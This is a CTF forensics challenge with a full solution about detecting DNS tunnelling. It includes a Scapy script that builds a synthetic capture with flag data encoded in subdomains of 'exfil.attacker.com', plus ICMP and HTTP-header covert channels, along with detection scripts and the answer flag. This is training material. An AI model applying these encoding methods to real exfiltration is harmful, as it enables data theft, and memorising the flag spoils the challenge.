# Challenge 05 - PCAP Analysis

**Category:** Forensics
**Difficulty:** Intermediate
**Points:** 250
**Target:** Network Capture File (PCAP)

## Challenge Description

Our incident response team captured network traffic during a suspected data exfiltration incident. The attacker was clever - they used covert channels to hide their communication and steal sensitive data.

Your mission is to analyze the packet capture, identify the exfiltration technique, extract the stolen data, and find the flag that was transmitted.

## Objectives

- Analyze complex network traffic
- Identify covert channel communication
- Detect DNS tunneling/exfiltration
- Extract hidden data from protocols
- Reconstruct exfiltrated files

## Target Information

- **File:** challenge05-exfil.pcap
- **Capture Duration:** ~5 minutes
- **Protocols:** HTTP, DNS, ICMP, TCP
- **Suspicious Activity:** Data exfiltration via covert channel

## Getting Started

1. Create the challenge PCAP file:

```python
#!/usr/bin/env python3
"""Generate PCAP with DNS exfiltration and hidden flag"""

from scapy.all import *
import base64
import random
import time

packets = []

# Normal traffic noise
for i in range(20):
    packets.append(IP(src="192.168.1.100", dst="93.184.216.34")/TCP(sport=random.randint(49152,65535), dport=80, flags="S"))
    packets.append(IP(src="192.168.1.100", dst="8.8.8.8")/UDP(sport=random.randint(49152,65535), dport=53)/DNS(rd=1, qd=DNSQR(qname=f"www.example{i}.com")))

# DNS exfiltration - flag hidden in subdomain queries
flag = "FLAG{dn5_tunn3l1ng_3xf1l}"
flag_b64 = base64.b64encode(flag.encode()).decode()

# Split and encode in DNS queries
chunks = [flag_b64[i:i+10] for i in range(0, len(flag_b64), 10)]

for i, chunk in enumerate(chunks):
    # Exfiltration query - data in subdomain
    query = f"{chunk}.{i}.exfil.attacker.com"
    packets.append(IP(src="192.168.1.100", dst="10.10.10.53")/UDP(sport=random.randint(49152,65535), dport=53)/DNS(rd=1, qd=DNSQR(qname=query)))
    time.sleep(0.1)

# More noise
for i in range(20):
    packets.append(IP(src="192.168.1.100", dst="1.1.1.1")/UDP(sport=random.randint(49152,65535), dport=53)/DNS(rd=1, qd=DNSQR(qname=f"api.service{i}.io")))

# ICMP exfiltration - secondary method
secret = b"password123"
for byte in secret:
    packets.append(IP(src="192.168.1.100", dst="10.10.10.1")/ICMP(type=8, code=0, id=1337, seq=byte))

# HTTP traffic with hidden data in headers
http_payload = f"""GET /update HTTP/1.1\r
Host: cdn.legitimate.com\r
User-Agent: Mozilla/5.0\r
X-Session-Data: {base64.b64encode(b"BACKUP_FLAG{http_h34d3r_h1d1ng}").decode()}\r
Accept: */*\r
\r
"""
packets.append(IP(src="192.168.1.100", dst="104.21.234.56")/TCP(sport=54321, dport=80, flags="PA")/Raw(load=http_payload.encode()))

# Normal HTTPS connections
for i in range(15):
    packets.append(IP(src="192.168.1.100", dst="172.217.14.99")/TCP(sport=random.randint(49152,65535), dport=443, flags="S"))

wrpcap("/tmp/challenge05-exfil.pcap", packets)
print("PCAP created: /tmp/challenge05-exfil.pcap")
print(f"Primary flag (DNS): {flag}")
print("Backup flag in HTTP header")
```

2. Alternatively, download from challenge files directory

3. Open with Wireshark:
   ```bash
   wireshark /tmp/challenge05-exfil.pcap
   ```

---

## Hints

<details>
<summary>Hint 1 (Cost: -25 points)</summary>

Look at the DNS queries carefully. Are there any domains that look unusual?

Use the filter: `dns`

Normal DNS queries go to public DNS servers like 8.8.8.8 or 1.1.1.1. But look for queries going to private IP addresses like 10.x.x.x - that's suspicious!

</details>

<details>
<summary>Hint 2 (Cost: -35 points)</summary>

DNS tunneling hides data in the subdomain portion of DNS queries.

Filter for suspicious DNS:
```
dns.qry.name contains "exfil"
```

Extract the subdomain data from each query. Notice the pattern:
- `<data>.<sequence>.<domain>`

The data portions are base64 encoded.

</details>

<details>
<summary>Hint 3 (Cost: -50 points)</summary>

Extract all DNS queries to the suspicious domain:
```bash
tshark -r challenge05-exfil.pcap -Y "dns.qry.name contains exfil" -T fields -e dns.qry.name
```

Output:
```
RkxBR3tk.0.exfil.attacker.com
bjVfdHVu.1.exfil.attacker.com
bjNsMW5n.2.exfil.attacker.com
XzN4ZjFs.3.exfil.attacker.com
fQ==.4.exfil.attacker.com
```

Concatenate the first parts and base64 decode: `RkxBR3tkbjVfdHVubjNsMW5nXzN4ZjFsfQ==`

</details>

---

## Solution Walkthrough

<details>
<summary>Click to reveal full solution</summary>

### Step 1: Initial Analysis

Open the PCAP and get an overview:

```bash
# Protocol hierarchy
tshark -r challenge05-exfil.pcap -q -z io,phs

# Conversation statistics
tshark -r challenge05-exfil.pcap -q -z conv,ip
```

Or in Wireshark: Statistics > Protocol Hierarchy

### Step 2: Identify Suspicious Traffic

Look for anomalies:
- DNS queries to private IPs (unusual)
- High volume of DNS queries (potential tunneling)
- Unusual subdomain patterns (data exfiltration)

Filter suspicious DNS:
```
dns and ip.dst == 10.10.10.53
```

### Step 3: Analyze DNS Exfiltration

List all DNS queries to the suspicious server:

```bash
tshark -r challenge05-exfil.pcap \
       -Y "dns.qry.name contains exfil" \
       -T fields -e dns.qry.name | sort -t. -k2 -n
```

Output:
```
RkxBR3tk.0.exfil.attacker.com
bjVfdHVu.1.exfil.attacker.com
bjNsMW5n.2.exfil.attacker.com
XzN4ZjFs.3.exfil.attacker.com
fQ==.4.exfil.attacker.com
```

### Step 4: Extract and Decode the Data

```python
#!/usr/bin/env python3
"""Extract DNS exfiltration data"""

import subprocess
import base64
import re

# Extract DNS queries using tshark
cmd = "tshark -r /tmp/challenge05-exfil.pcap -Y 'dns.qry.name contains exfil' -T fields -e dns.qry.name"
output = subprocess.check_output(cmd, shell=True).decode()

# Parse and sort by sequence number
data_parts = []
for line in output.strip().split('\n'):
    match = re.match(r'([A-Za-z0-9+/=]+)\.(\d+)\.exfil\.', line)
    if match:
        data, seq = match.groups()
        data_parts.append((int(seq), data))

# Sort by sequence and concatenate
data_parts.sort()
encoded_data = ''.join([d[1] for d in data_parts])

print(f"Encoded data: {encoded_data}")

# Decode base64
try:
    decoded = base64.b64decode(encoded_data).decode()
    print(f"Decoded flag: {decoded}")
except Exception as e:
    print(f"Decode error: {e}")
```

Result:
```
Encoded data: RkxBR3tkbjVfdHVubjNsMW5nXzN4ZjFsfQ==
Decoded flag: FLAG{dn5_tunn3l1ng_3xf1l}
```

### Step 5: Check for Other Exfiltration Methods

**ICMP Exfiltration:**
```bash
tshark -r challenge05-exfil.pcap -Y "icmp.type == 8" -T fields -e icmp.seq
```

The sequence numbers might encode data (ASCII values).

**HTTP Header Exfiltration:**
```bash
tshark -r challenge05-exfil.pcap \
       -Y "http" \
       -T fields -e http.request.full_uri -e http.user_agent -e http.x_session_data
```

Decode X-Session-Data header:
```python
import base64
data = "QkFDS1VQX0ZMQUd7aHR0cF9oMzRkM3JfaDFkMW5nfQ=="
print(base64.b64decode(data).decode())
# BACKUP_FLAG{http_h34d3r_h1d1ng}
```

### Wireshark Analysis Steps

1. **Filter by protocol**: `dns`, `http`, `icmp`

2. **Follow streams**: Right-click > Follow > TCP/UDP Stream

3. **Export objects**: File > Export Objects > HTTP

4. **Statistics**:
   - Endpoints: Statistics > Endpoints
   - Conversations: Statistics > Conversations
   - DNS: Statistics > DNS

### Common Exfiltration Techniques

| Technique | Detection Method | Wireshark Filter |
|-----------|-----------------|------------------|
| DNS Tunneling | Long subdomains, high query rate | `dns.qry.name.len > 50` |
| ICMP Tunneling | Data in ICMP payload | `icmp.data` |
| HTTP Headers | Custom headers | `http.request.full_uri` |
| HTTPS (encrypted) | High volume to single IP | `ssl` |
| DNS TXT Records | Large TXT responses | `dns.txt` |

### DNS Tunneling Detection Script

```python
#!/usr/bin/env python3
"""DNS Tunneling Detection"""

from scapy.all import *
import collections

def analyze_dns_tunneling(pcap_file):
    packets = rdpcap(pcap_file)

    domain_stats = collections.defaultdict(lambda: {
        'query_count': 0,
        'avg_subdomain_len': 0,
        'subdomains': []
    })

    for pkt in packets:
        if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
            qname = pkt[DNSQR].qname.decode()
            parts = qname.rstrip('.').split('.')

            if len(parts) >= 2:
                domain = '.'.join(parts[-2:])
                subdomain = '.'.join(parts[:-2]) if len(parts) > 2 else ''

                domain_stats[domain]['query_count'] += 1
                domain_stats[domain]['subdomains'].append(subdomain)

    # Identify suspicious domains
    print("Suspicious Domains (potential tunneling):")
    for domain, stats in domain_stats.items():
        avg_len = sum(len(s) for s in stats['subdomains']) / max(len(stats['subdomains']), 1)
        if avg_len > 10 or stats['query_count'] > 20:
            print(f"  {domain}:")
            print(f"    - Query count: {stats['query_count']}")
            print(f"    - Avg subdomain length: {avg_len:.1f}")
            print(f"    - Sample: {stats['subdomains'][:3]}")

analyze_dns_tunneling("/tmp/challenge05-exfil.pcap")
```

### Prevention & Detection

**Network-level:**
- Monitor DNS query lengths and frequencies
- Block DNS queries to non-approved servers
- Use DNS security solutions (DNSSEC, DNS filtering)
- Analyze DNS query patterns

**Endpoint-level:**
- Monitor processes making DNS queries
- Track base64 patterns in DNS queries
- Log and alert on high DNS query rates

</details>

---

## Flag

```
FLAG{dn5_tunn3l1ng_3xf1l}
```

**Flag Format:** `FLAG{...}`

## Skills Practiced

- PCAP analysis with Wireshark
- DNS tunneling detection
- Data exfiltration techniques
- Protocol analysis
- Python scripting for forensics

## Tools Used

- Wireshark
- tshark
- Scapy
- Python
- base64 decoder

## Related Challenges

- [04 - What's in the Packet? (Beginner)](../beginner/04-whats-in-the-packet.md) - Basic PCAP
- [File Inclusion (Intermediate)](03-file-inclusion.md) - Data extraction

## References

- [DNS Tunneling Explained](https://www.infoblox.com/dns-security-resource-center/dns-security-issues-threats/dns-security-threats-dns-tunneling/)
- [Wireshark User Guide](https://www.wireshark.org/docs/wsug_html/)
- [Detecting DNS Tunneling](https://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152)
- [Scapy Documentation](https://scapy.readthedocs.io/)
